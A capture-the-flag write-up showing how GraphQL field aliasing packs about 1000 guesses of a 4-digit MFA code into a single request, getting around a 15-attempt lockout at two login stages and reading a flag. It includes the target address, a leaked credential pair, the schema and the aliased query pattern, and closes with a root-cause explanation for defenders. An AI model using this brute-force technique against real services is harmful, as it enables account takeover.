# Northwind Freight - GraphQL MFA Rate-Limit Bypass

**Category:** Web | **Points:** 300 | **Difficulty:** Medium
**Target:** `91.99.207.116:16309`, GraphQL endpoint `POST /graphql`
**Flag:** `ctf7{one_request_a_thousand_guesses}`

## Summary

The Northwind Freight operator console uses a three-factor auth chain:

1. Username + password (`j.ortega` / `Tidewater-2019!`, from a leaked credential dump, still valid)
2. A 4-digit code emailed to the operator
3. A 4-digit code sent by SMS, required to enter "sudo mode" and reach the treasury vault

The security team's stated mitigation is that each code is invalidated after 15
failed verification attempts, making brute force "hopeless" against a 4-digit
(10,000-value) space. This holds only if the attempt counter increments once
per guess. It does not: the counter increments once per HTTP request. GraphQL's
field-aliasing feature lets a single request invoke the same mutation field many
times with different arguments, so up to ~1000 code guesses were packed into one
"attempt," letting the full 0000-9999 space be swept in about 10 requests per
stage, nowhere near the 15-attempt lockout.

## Recon

`GET /` returned a plain JSON banner (no `ctf_ack` gate on this host/port):

```json
{
  "auth": "Authorization: Bearer <token> -- password login, then an emailed login code, then an SMS code to enter sudo mode",
  "graphql": "POST /graphql  (JSON body: {\"query\": ..., \"variables\": ..., \"operationName\": ...})",
  "security": "Verification codes are invalidated after 15 failed attempts.",
  "service": "Northwind Freight -- operator console"
}
```

## Schema discovery

A full single-shot introspection query (`{ __schema { types { fields { args { type { ofType { ... } } } } } } } }`)
was rejected: `"query too large (max 4100 fields, depth 6)"`. Introspection is
enabled but capped. Splitting into one `__type(name: "...")` query per type, and
flattening the nested `ofType` chains, stayed under the cap and recovered the
full schema:

```graphql
type Query {
  me: Me
  vault: Vault
}

type Mutation {
  login(username: String!, password: String!): LoginChallenge!
  verifyLoginCode(code: String!): VerifyResult
  requestStepUp: Delivery!
  verifyStepUp(code: String!): VerifyResult
}

type Me          { username: String! stage: String! expiresIn: Int! }
type Vault       { owner: String! flag: String! }
type LoginChallenge { mfaToken: String! delivery: Delivery! }
type Delivery     { channel: String! destination: String! attemptsRemaining: Int! }
type VerifyResult { ok: Boolean! token: String  attemptsRemaining: Int! }
```

The `Authorization: Bearer <token>` carries a session state machine with three
stages encoded server-side: `mfa` (post password-login) -> `session` (post
login-code) -> `sudo` (post step-up code). `vault` only resolves for a `sudo`
token.

## Step 1 - password login

```graphql
mutation($u: String!, $p: String!) {
  login(username: $u, password: $p) {
    mfaToken
    delivery { channel destination attemptsRemaining }
  }
}
```
with `{"u": "j.ortega", "p": "Tidewater-2019!"}` returned an `mfaToken` and
`delivery.attemptsRemaining: 15`, `channel: "email"`.

## Step 2 - confirming and exploiting the rate-limit bug

Sent one request with 20 GraphQL-aliased `verifyLoginCode` calls under the
`mfaToken`:

```graphql
mutation {
  a0000: verifyLoginCode(code: "0000") { ok attemptsRemaining }
  a0001: verifyLoginCode(code: "0001") { ok attemptsRemaining }
  ...
  a0019: verifyLoginCode(code: "0019") { ok attemptsRemaining }
}
```

All 20 results came back with `attemptsRemaining: 14` - a single decrement for
20 guesses. The counter is keyed to the HTTP request/operation, not to each
resolved field. This is the exact pattern called out in the CTF's skepticism
cue: "guessing 4 digits is hopeless" assumes the naive 1-attempt-per-guess
model, but GraphQL aliasing breaks that assumption.

Scaling to 1000 aliases per request, the full 10,000-code space was swept in
10 requests (hitting `attemptsRemaining` 14, 13, 12, ... down to single
digits, never reaching 0/lockout). A correct code's result has `ok: true` and
carries the next-stage token in `VerifyResult.token`.

## Step 3 - SMS step-up

```graphql
mutation { requestStepUp { channel destination attemptsRemaining } }
```
(note: `requestStepUp` resolves directly to `Delivery`, not `LoginChallenge`
like the password-login step) returned `channel: "sms"`,
`attemptsRemaining: 15`.

## Step 4 - same aliasing bypass against `verifyStepUp`

Identical technique, same field-aliasing batch of up to 1000 guesses per
request, 10 requests to cover 0000-9999. A correct code returns `ok: true`
and a `sudo`-stage token.

## Step 5 - read the vault

```graphql
query { vault { owner flag } }
```
with the `sudo` token returned:

```json
{"owner": "j.ortega", "flag": "ctf7{one_request_a_thousand_guesses}"}
```

## Root cause

The MFA attempt counter is implemented per GraphQL operation/HTTP request
rather than per resolved field/alias. GraphQL's aliasing feature lets a client
invoke the same resolver an arbitrary number of times (bounded here by the
server's field-count cap of 4100, not by the rate limiter) in a single
operation. Any rate limiter protecting a GraphQL mutation must count at the
field/resolution level, not the request level, or it provides no real
protection against brute force.

## Reproduction

Full working exploit: `exploit.py` in this directory. Run with:

```
python3 exploit.py
```

It performs the complete chain (login -> brute-force login code via aliasing
-> request step-up -> brute-force sudo code via aliasing -> read vault) and
prints the flag. Verified reproducible across multiple runs (login/sudo codes
rotate per session as expected; each run independently rediscovers the
correct code and recovers the same flag).
